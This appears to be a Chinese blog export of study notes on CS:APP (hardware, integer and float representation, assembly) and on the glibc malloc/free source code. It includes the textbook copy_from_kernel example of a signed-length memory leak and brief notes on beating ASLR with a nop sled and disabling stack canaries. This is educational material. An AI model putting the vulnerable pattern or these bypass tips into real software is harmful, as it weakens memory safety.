<code>cpp</code></td><td>根据以<code>#</code>开头的命令进行<strong>预处理</strong>，读取系统头文件中的内容并且<strong>直接插入</strong>到程序文本中</td><td><code>.i</code></td><td>文本文件</td></tr><tr><td>编译阶段</td><td>编译器     <code>ccl</code></td><td>将<code>.i</code>文件翻译成<strong>汇编语言程序</strong></td><td><code>.s</code></td><td>文本文件</td></tr><tr><td>汇编阶段</td><td>汇编器     <code>as</code></td><td>将<code>.s</code>文件翻译成<strong>机器语言指令</strong>，打包成<strong>可重定位目标程序</strong>格式</td><td><code>.o</code></td><td>二进制文件</td></tr><tr><td>链接阶段</td><td>连接器     <code>ld</code></td><td>将程序中调用的函数的单独编译好的<code>.o</code>目标文件和汇编得到的<code>.o</code>文件合并成<strong>可执行文件</strong>，存在<strong>磁盘</strong></td><td><code>\</code></td><td>二进制文件</td></tr></tbody></table><p><strong>GNU项目</strong>：完整的类<code>Unix</code>系统，源代码能不受限制的被修改和传播，其环境包括**<code>EMACS</code>编辑器，<code>GCC</code>编译器，<code>GDB</code>调试器，汇编器，链接器，处理二进制文件的工具**等</p><h2 id="处理器读并解释储存在内存中的指令"><a href="#处理器读并解释储存在内存中的指令" class="headerlink" title="处理器读并解释储存在内存中的指令"></a>处理器读并解释储存在内存中的指令</h2><p><code>shell</code>：命令行解释器</p><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><h4 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h4><p><strong>作用</strong>：<strong>携带、传递定长的字节块</strong></p><p><strong>补充</strong>：字节块 &#x3D; 字， <strong>属性</strong>： 字节数 &#x3D; 字长， <strong>机器字长</strong>： 32位中字长为4字节，64位中字长为8字节</p><h4 id="I-x2F-O设备"><a href="#I-x2F-O设备" class="headerlink" title="I&#x2F;O设备"></a>I&#x2F;O设备</h4><p><strong>功能</strong>：通过<strong>控制器</strong>或<strong>适配器</strong>与<code>I/O</code>总线相连，在<code>I/O</code>主总线和<code>I/O</code>设备之间<strong>传递信息</strong></p><p><strong>封装方式的区别</strong>：<strong>控制器</strong>是I&#x2F;O设备本身或系统主印制电路板（即<strong>主板</strong>）上的<strong>芯片组</strong>，<strong>适配器</strong>是插在<strong>主板插槽上的卡</strong></p><p><strong>例子</strong>：磁盘、键盘、显示器、网络</p><h4 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h4><p><strong>作用</strong>：用来存放<strong>程序和程序处理的数据</strong>的<strong>临时存储设备</strong></p><p><strong>组成</strong>：由一组<strong>动态随机存取存储器（DRAM）芯片</strong>组成的线性的<strong>字节数组</strong></p><h4 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h4><p><strong>别称</strong>：中央处理单元、<code>CPU</code>、中央处理器</p><p><strong>功能</strong>：解释或执行存储在主存中的指令的引擎，不断执行<code>PC</code>指向的指令，解释指令中的位，执行该指令指示的简单操作，然后更新<code>PC</code>指向下一条指令（<strong>不一定相邻</strong>）</p><p><strong>简单指令</strong>：围绕着主存、寄存器文件、算术&#x2F;逻辑单元<code>ALU</code>进行，例如：加载、存储、操作、跳转</p><p><strong>寄存器文件</strong>：是一个小的<strong>存储设备</strong>，由一些<strong>单个字长的寄存器</strong>组成</p><p><strong>指令集架构</strong>：描述每条机器代码指令的<strong>效果</strong></p><p><strong>微体系结构</strong>：描述处理器实际上是如何<strong>实现</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/1.jpg" class title="系统的硬件组成"><h2 id="高速缓存和存储设备形成层次结构"><a href="#高速缓存和存储设备形成层次结构" class="headerlink" title="高速缓存和存储设备形成层次结构"></a>高速缓存和存储设备形成层次结构</h2><h3 id="高速缓存cache"><a href="#高速缓存cache" class="headerlink" title="高速缓存cache"></a>高速缓存cache</h3><p><strong>作用</strong>：<strong>存放</strong>可能经常访问的<strong>数据</strong>，大部分的内存<strong>操作</strong>都能快速在高速缓存中完成，节省了内存、I&#x2F;O设备喝CPU寄存器之间的复制数据</p><h3 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h3><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/2.jpg" class title="一个存储器层次结构的示例"><p><strong>主要思想</strong>：上一层的存储器作为低一层存储器的高速缓存，了解不同的高速缓存和对整个存储器层次结构可以提高程序性能</p><h2 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>功能</strong></p><ul><li>防止硬件被失控的应用程序滥用</li><li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备，<strong>所有应用程序对硬件的操作都必须通过操作系统</strong></li></ul><p><strong>实现</strong>：通过进程、虚拟内存、文件实现</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/3.jpg" class title="操作系统提供的抽象表示"><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><strong>进程</strong>：操作系统对正在运行的程序的一种抽象</p><p><strong>并发运行</strong>：一个进程的指令和另一个进程的指令是<strong>交错执行</strong>的</p><p><strong>上下文</strong>：<strong>操作系统</strong>保持根据进程运行所需的所有<strong>状态信息</strong>，这种状态成为上下文</p><p><strong>上下文切换</strong>：操作系统<strong>实现交错执行的机制</strong>，执行的是<strong>内核代码</strong></p><p><strong>单处理器系统</strong>：只能执行<strong>一个进程</strong>代码，系统绝对把控制权从当前进程转移到新进程就会上下文切换，控制权传递到新进程</p><p><strong>内核kernel</strong>：从一个进程到另一个进程的<strong>转换</strong>是由操作系统内核<strong>管理</strong>的，内核时<strong>操作系统</strong>代码常驻主存的部分，不是一个独立的进程，而是系统管理全部进程所用代码和数据结构的集合。</p><p><strong>系统调用</strong>：应用程序需要系统的某些操作时，执行系统调用将<strong>控制权</strong>传递给操作系统<strong>内核</strong>，内核执行被请求的操作并返回应用程序</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/4.jpg" class title="进程的上下文切换"><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>线程</strong>: 组成进程的<strong>执行单元</strong>，运行在进程的上下文中，每个线程共享同样的代码和全局数据</p><p><strong>多线程的优点</strong>：容易共享数据，高效，运行的快</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><strong>虚拟内存</strong>：是一个抽象概念，为每个进程提供了独占的使用主存的假象，其运作需要硬件和操作系统软件的交互</p><p><strong>虚拟地址空间</strong>：每个进程看到的一致的内存</p><p><strong>虚拟地址空间的区域</strong>（由低地址到高地址）</p><table><thead><tr><th>区域名称</th><th>内容</th></tr></thead><tbody><tr><td>程序代码和数据</td><td>代码从固定地址开始，接着是C全局变量对应的数据位置</td></tr><tr><td>堆</td><td>动态扩展和收缩</td></tr><tr><td>共享库</td><td>存放例如C标准库、数学库这样的共享库的代码和数据的区域</td></tr><tr><td>栈</td><td>用户虚拟地址空间顶部的是用户栈，用于实现函数调用，动态扩展和收缩，调用函数时栈增长，反之收缩</td></tr><tr><td>内核虚拟内存</td><td>地址空间顶部，不允许应用程序读写或直接调用内核代码定义的函数，必须调用内核来执行</td></tr></tbody></table><p><strong>基本思想</strong>：把一个进程虚拟内存的内容存储在磁盘上，然后用主存作为磁盘的高速缓存</p><h1 id="第二章-信息的表示和处理"><a href="#第二章-信息的表示和处理" class="headerlink" title="第二章 信息的表示和处理"></a>第二章 信息的表示和处理</h1><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p><strong>特点</strong>：每个数字占<strong>4位</strong></p><p><strong>十六进制转二进制</strong>：直接将每个数字的二进制依次排列即可</p><p><strong>二进制转十六进制</strong>：则从后往前每四位分一部分最前面不足补0</p><h3 id="字节顺序"><a href="#字节顺序" class="headerlink" title="字节顺序"></a>字节顺序</h3><p><strong>小端法和大端法</strong>：大端法是正序，从最低有效字节到最高有效字节，小端法相反。大多机器使用小端法</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/5.jpg" class title="0x1234567的大端序和小端序"><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><strong>特点</strong>：以<code>null</code>（值为<code>0</code>）结尾，数字<code>x</code>的<code>ASCII</code>码为<code>0x3x</code>，不受大端小端的影响在任何系统结果相同</p><h3 id="位移运算"><a href="#位移运算" class="headerlink" title="位移运算"></a>位移运算</h3><p><strong>左移</strong>：末尾补<code>k</code>个<code>0</code>，取后<code>m</code>位</p><p><strong>逻辑右移</strong>：前补<code>k</code>个<code>0</code>，取前<code>m</code>位（无符号数）</p><p><strong>算数右移</strong>：前补<code>k</code>个首位的数，取前<code>m</code>位（常用）</p><p><strong>特殊情况</strong>：<code>k &gt; m</code>，则位移 <code>k mod m</code>位</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="有符号数与无符号数的数值范围"><a href="#有符号数与无符号数的数值范围" class="headerlink" title="有符号数与无符号数的数值范围"></a>有符号数与无符号数的数值范围</h3><table><thead><tr><th>符号</th><th>数值</th></tr></thead><tbody><tr><td><code>UMaxw</code></td><td>2^w - 1</td></tr><tr><td><code>UMinw</code></td><td>0</td></tr><tr><td><code>TMaxw</code></td><td>2^（w-1） - 1</td></tr><tr><td><code>TMinw</code></td><td>-2^（w - 1）</td></tr></tbody></table><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define INT_MAX 2147483647#define INT_MIN (-INT_MAX - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>不对称性</strong>：<code>|TMinw| = |TMaxw| + 1UMaxw = 2TMaxw + </code>，因此不是所有负数都存在相反数</p><h3 id="补码two’s-complement"><a href="#补码two’s-complement" class="headerlink" title="补码two’s complement"></a>补码two’s complement</h3><p><strong>特点</strong>：将最高有效位解释为负权，也称符号位，权重为<code>-2^w-1</code>（其二进制共w位），正数补码为原码，负数补码为其二进制取反后加一</p><p><strong>转换为无符号数的规则</strong>：位值不变，只是改变了最高位的解释位的方式，即是否为符号位</p><p><strong>转换计算方法</strong>:-1 和<code>UMaxw</code>位表示相同，全1的串,<code>0 ~ TMaxw</code>之内转换数值不变，范围之外转换加上或减去<code>2^w</code></p><p><strong>隐式类型转换</strong>：</p><ul><li><p>相互赋值</p></li><li><p><code>printf</code>输出时使用不对应的格式化字符串</p></li><li><p>算术运算或比较一边存在无符号数则另外一边强制转为无符号数</p></li></ul><h3 id="扩展和截断"><a href="#扩展和截断" class="headerlink" title="扩展和截断"></a>扩展和截断</h3><p><strong>无符号数转换为一个更大的数据类型</strong>：零扩展，即二进制前导补<code>0</code></p><p><strong>补码转换为一个更大的数据类型</strong>：符号扩展，即二进制前导补符号扩展位的值</p><p><strong>长度不同的类型之间的转换</strong>：长度转一致之后再类型转换，如<code>short</code>转<code>unsigned</code>要先转为<code>int</code>再转<code>unsigned</code></p><p><strong>截断规则</strong>：舍弃高位，补码将最高位转换为符号位</p><h3 id="关于符号数与无符号数的建议"><a href="#关于符号数与无符号数的建议" class="headerlink" title="关于符号数与无符号数的建议"></a>关于符号数与无符号数的建议</h3><p>尽量避免无符号&#x2F;有符号类型的混用，因为这样可能会进行隐式类型转换，造成非预期的错误</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define KSIZE 1024char kbuf[KSIZE];void *memcpy(void *dest, void*src, size_t n);int copy_from_kernel(void* user_dest, int maxlen)&#123;  int len &#x3D; KSIZE &lt; maxlen ? KSIZE : maxlen;  memcpy(user_dest, kbuf, len);  return len;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例中，<code>memcpy</code>函数的定义中<code>n</code>类型为<code>size_t</code>，若<code>len</code>输入负数则会导致<code>n</code>为一个很大的数，使程序读取到它没有被被授权的内核内存区域</p><h2 id="IEEE浮点表示"><a href="#IEEE浮点表示" class="headerlink" title="IEEE浮点表示"></a>IEEE浮点表示</h2><p>公式： <code>V = （-1）^s * M * 2^E</code></p><table><thead><tr><th>位名称</th><th>释义和值</th></tr></thead><tbody><tr><td>s</td><td>符号位，一个单独的位编码符号位</td></tr><tr><td>M</td><td>尾数，一个二进制小数，编码为n位小数字段frac</td></tr><tr><td>E</td><td>阶码，用于对浮点加权，编码为k为的阶码字段exp，被解释为以偏置形式表示的有符号整数</td></tr><tr><td>f</td><td>frac &#x2F; 2 ^ n</td></tr><tr><td>Bias</td><td>偏置值，2^（k-1） - 1</td></tr></tbody></table><table><thead><tr><th>类别</th><th>特点</th><th>E</th><th>M</th></tr></thead><tbody><tr><td>规格化的值</td><td>阶码域有0有1</td><td>e - Bias</td><td>1 + f</td></tr><tr><td>非规格化的值</td><td>阶码域全为0</td><td>1 - Bias</td><td>f</td></tr><tr><td>特殊值</td><td>阶码域全为1，s &#x3D; 0为正无穷，s&#x3D;1为负无穷，能够表示溢出的结果，小数域非0称为NaN</td><td>\</td><td>\</td></tr></tbody></table><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/6.jpg" class title="标准浮点格式"><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/7.jpg" class title="单精度浮点数值分类"><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/8.jpg" class title="8位浮点格式的非负值示例"><p><strong>注意</strong>：浮点数可以表示的值范围比整数大但只是近似表示，数字越大精度越低，其运算不具有结合性，且单精度与双精度值进行比较可能会发生错误，当超过最大的规格化的值时会发生溢出</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h2 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h2><ul><li><p>用条件转移实现条件分支</p><p>在现代处理器上会非常低效，因为处理器通过使用流水线来获得高性能，要求能够实现确定执行的指令序列。当机器遇到条件跳转时只有当分支条件求值完成才能决定走哪条分支，处理器会采用分支预测逻辑来猜测每条跳转指令是否执行，当预测错误时会严重降低性能</p></li><li><p>用条件传送来实现条件分支</p><p>计算一个条件操作的两种结果，然后根据条件是否满足从中选取一个</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;计算两个数的差的绝对值&#x2F;&#x2F;使用条件转移long cmowdiff (long x, long y)&#123;long result;if(x &lt; y)result &#x3D; y - x;else result &#x3D; x - y;return result;&#125;&#x2F;&#x2F;使用条件传送long cmowdiff (long x, long y)&#123;    long rval &#x3D; y - x;    long eval &#x3D; x - y;    long ntest &#x3D; x &gt;&#x3D; y;    if(ntest)rval &#x3D; eval;    return rval;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="浮点代码"><a href="#浮点代码" class="headerlink" title="浮点代码"></a>浮点代码</h2><p>浮点代码使用的寄存器是<code>ymm0~ymm15</code>，可以保存<code>32</code>字节，其低<code>16</code>字节是<code>xmm</code>寄存器,浮点函数的</p><p>xmm寄存器用来向函数传递和返回浮点数，函数使用xmm0返回浮点值</p><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><table><thead><tr><th>数据类型</th><th>术语</th><th>汇编代码</th><th>大小</th></tr></thead><tbody><tr><td>字节</td><td>byte</td><td>b</td><td>1字节    8位</td></tr><tr><td>字</td><td>word</td><td>w</td><td>2字节   16位</td></tr><tr><td>双字</td><td>double words</td><td>l</td><td>4字节   32位</td></tr><tr><td>四字</td><td>quad words</td><td>q</td><td>8字节    64位</td></tr></tbody></table><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><pre class="line-numbers language-none"><code class="language-none">lea加载有效地址inc 加1dec减1neg取负sal左移sar算数右移shr逻辑右移mul乘cqto转换为8字div除cmp比较test测试set将一个字节设置为0或1CF进位标志，检查无符号操作的溢出ZF零标志SF符号标志OF溢出标志，补码的正&#x2F;负溢出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>形式包括：函数，方法，子例程，处理函数</p><p>栈帧：存储空间超出寄存器能够存放的大小时就会在栈上分配空间，这个部分成为过程的栈帧，栈指针是<code>rsp</code>，帧指针是<code>rbp</code></p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><pre class="line-numbers language-none"><code class="language-none">kill    停止程序delete      删除断点info frame    有关当前栈帧的信息info registers所有寄存器值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h2><p><code>ASLR</code>：通过在程序开始时分配一段随机大小的空间而不使用，使得后续栈位置发生变化。可以通过在攻击代码前插入<code>nop</code>滑过随机大小的序列</p><p><code>NX</code>：限制可执行代码区域，堆栈不可执行</p><p><code>canary</code>：检测缓冲区越界，可以使用<code>-fno-stack-protector</code>关闭<code>canary</code>保护</p>]]></content>
      
      
      <categories>
          
          <category> 计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc源码分析-malloc-free</title>
      <link href="/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/"/>
      <url>/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/</url>
      
        <content type="html"><![CDATA[<h1 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h1><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_state&#123;  &#x2F;* Serialize access.  *&#x2F;  mutex_t mutex;  &#x2F;* Flags (formerly in max_fast).  *&#x2F;  int flags;  &#x2F;* Fastbins *&#x2F;  mfastbinptr fastbinsY[NFASTBINS];  &#x2F;* Base of the topmost chunk -- not otherwise kept in a bin *&#x2F;  mchunkptr top;  &#x2F;* The remainder from the most recent split of a small request *&#x2F;  mchunkptr last_remainder;  &#x2F;* Normal bins packed as described above *&#x2F;  mchunkptr bins[NBINS * 2 - 2];  &#x2F;* Bitmap of bins *&#x2F;  unsigned int binmap[BINMAPSIZE];  &#x2F;* Linked list *&#x2F;  struct malloc_state *next;  &#x2F;* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  *&#x2F;  struct malloc_state *next_free;  &#x2F;* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  *&#x2F;  INTERNAL_SIZE_T attached_threads;  &#x2F;* Memory allocated from the system in this arena.  *&#x2F;  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_chunk &#123;  INTERNAL_SIZE_T      mchunk_prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      mchunk_size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="初次创建堆"><a href="#初次创建堆" class="headerlink" title="初次创建堆"></a>初次创建堆</h1><h2 id="非mmap"><a href="#非mmap" class="headerlink" title="非mmap"></a>非mmap</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>进入<code>__libc_malloc  </code></p></li><li><p>调用<code>__malloc_hook</code>中的函数来完成堆分配并返回，若为默认值则向下运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *(*hook) (size_t, const void *)    &#x3D; atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>程序第一次运行<code>__libc_malloc  </code>时，<code>__malloc_hook</code>中的值是<code>hook.c</code>中的<code>malloc_hook_ini</code>函数，因此会调用该函数，用于对<code>__malloc_hook</code>进行初始化，初始化结束后值为0，后续再创建堆就是默认值0</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">malloc_hook_ini (size_t sz, const void *caller)&#123;  __malloc_hook &#x3D; NULL;  ptmalloc_init ();  return __libc_malloc (sz);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化过程：设置<code>__malloc_hook</code>为NULL，再调用<code>arena.c</code>中的<code>ptmalloc_init</code>进行初始化，<code>__malloc_initialized &gt; 0 </code>表示初始化完成</p></li><li><p>补充：<code>__builtin_expect</code></p><ul><li><p>作用：允许程序员将最有可能执行的分支告诉编译器</p></li><li><p>写法：<code>__builtin_expect(EXP, N)</code></p></li><li><p>含义：<code>EXP==N</code>的概率很大</p></li><li><p>返回值：当<code>EXP==N</code>时返回0，反之返回1</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define unlikely(x) __builtin_expect(!!(x), 0) &#x2F;&#x2F;x很可能为假#define likely(x) __builtin_expect(!!(x), 1) &#x2F;&#x2F;x很可能为真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;if成立的条件是hook !&#x3D; NULL成立，即hook不为空，则去调用hook中的函数if (__builtin_expect (hook !&#x3D; NULL, 0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul></li><li><p>调用<code>arena_get</code> 获取到管理空闲空间的分配区地址，申请的堆块就在这里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">arena_get (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入<code>_int_malloc</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; _int_malloc (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>victim</code>指向<code>_int_malloc</code>分配的内存</p></li><li><p>计算分配的实际大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">checked_request2size (bytes, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>ptmalloc</code> 以 chunk 为单位分配空间，传入的bytes 是用户提交的原始的空间大小</strong></p><p><strong><code>nb</code> 是为计算得到的 chunk 的大小</strong></p></li><li><p>检查是否有可用空间</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (av &#x3D;&#x3D; NULL))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>av = ar_ptr </code>是<code>arena_get</code> 获取到的分配区地址指针</strong></p></li><li><p>判断是否属于<code>fastbin</code></p><ul><li><p>通过判断<code>nb &lt;= get_max_fast()</code>即申请的实际大小是否小于<code>fastbin</code>最大值来判断是否属于<code>fastbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (nb) &lt;&#x3D; (unsigned long) (get_max_fast ()))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于<code>fastbin</code>则继续运行</p></li><li><p>获取实际大小<code>nb</code>所在的<code>fastbin</code>链表的<code>index</code>，并且获取指向该链表的第一个结点的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; fastbin_index (nb);mfastbinptr *fb &#x3D; &amp;fastbin (av, idx);mchunkptr pp &#x3D; *fb;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断指向的chunk是否为空</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do&#123;     victim &#x3D; pp;        if (victim &#x3D;&#x3D; NULL)        break;&#125;while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该 chunk 为空，说明当前 <code>fastbin </code>中没有刚好匹配 <code>nb </code>大小的空闲 <code>chunk</code></p></li></ul></li><li><p>判断是否属于<code>smallbin</code></p><ul><li><p>通过调用<code>in_smallbin_range</code>函数判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小所在的链表的<code>index</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断<code>smallbin</code>是否为空，为空则跳过剩下的代码</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)    &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>​<code>victim</code>指向<code>smallbin</code>中的最后一个bin，若其为空则<code>smallbin</code>为空</p><ul><li><p>调用<code>malloc_consolidate </code>整理<code>fastbins</code></p><ul><li><p>判断完不属于<code>smallbin</code>之后说明空间在<code>largebin</code>,不会立即检查<code>largebin</code>而是调用<code>malloc_consolidate </code>将<code>fastbins </code>里面的空闲 <code>chunk </code>合并整理到 <code>unsortedbin </code>中</p></li><li><p>判断<code>fastbins </code>为空，跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else    &#123;      idx &#x3D; largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>尝试切割top分配空间</p><ul><li><p>获取到 top chunk 的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; av-&gt;top;size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>victim</code>指向<code>av</code>内存空间中的<code>top chunk</code></p></li><li><p>和申请的空间大小做比较：如果 top chunk 在满足分配后还能剩余空间大小大于最小的 chunk 的大小，则开始进行切割，并把剩余的 chunk 作为新的 top chunk</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))        &#123;          remainder_size &#x3D; size - nb;          remainder &#x3D; chunk_at_offset (victim, nb);          av-&gt;top &#x3D; remainder;          set_head (victim, nb | PREV_INUSE |                    (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));          set_head (remainder, remainder_size | PREV_INUSE);          check_malloced_chunk (av, victim, nb);          void *p &#x3D; chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>否则先判断fastbin是否非空，非空则重整理，fastbin和unsorted bin</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (have_fastchunks (av))        &#123;          malloc_consolidate (av);          &#x2F;* restore original bin index *&#x2F;          if (in_smallbin_range (nb))      